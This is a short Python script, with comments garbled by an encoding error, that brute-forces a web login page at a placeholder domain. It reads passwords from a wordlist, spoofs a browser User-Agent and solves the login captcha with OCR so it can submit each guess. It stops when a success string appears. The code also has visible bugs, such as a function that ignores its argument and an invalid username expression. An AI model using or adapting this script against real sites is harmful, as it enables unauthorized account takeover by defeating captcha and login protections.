#����requests�⣬��2.x��urllib2��3.x��urllib.request���Ĺ��ܣ����������ǿ��
import requests
#����ͼ��ʶ���һЩ��
from PIL import Image
from io import BytesIO
import pytesseract
import urllib
 
#��½��̨
url = 'http://www.xx.cn/!logon'
 
#HTTP��headerͷ����Ӹ�user-agent���е���վ���User-Agent���ж��Ƿ��ǳ������
#����ǳ��������������Ӹ�user-agent������ƭ���ַ���
#������ĺ�̨wordpress�����ü�
headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
#���ʺ󣬱���cookie
s = requests.Session()
#�Ӹ�headers
s.headers.update(headers)
 
#��ȡͼƬ��֤��
def get_captcha_by_OCR(img):
    img = Image.open(BytesIO(response))
    #ͼƬ�ҶȻ�
    img = img.convert('L')
    img.show()
    #ʶ������ͼƬʶ��
    captcha = pytesseract.image_to_string(img)
    img.close()
    print(captcha)
    return captcha
 
#��ֹ�������
try:
    #��pwd.txt
    with open('pwd.txt','r') as f:
        #���з��ʲ��ҳ���
        for pwd in f:
            #ȥ��ÿ�е�\n�������ȡһ��ʱ������ö�������ʾ���ᷢ��ÿ�ж��и�\n
            pwd = pwd.replace('\n','')
            #print(pwd)
            response = urllib.request.urlopen('http://www.xx.cn/!code').read()
             
            #����post����
            data = {
                    'USERNAME':User(�Լ����û���),
                    'PASSWORD':pwd,
                    'AUTHCODE':get_captcha_by_OCR(response),
                    }
            #���Ե�½
            req = s.post(url,data = data)
            print(req.status_code)
            #ͨ��ĳЩ�����ж��Ƿ��½�ɹ�
            if 'SZ-09951217-Y' in req.text:
                print('OK')
                break
#�����������������
except requests.RequestException as e:
    print(e)
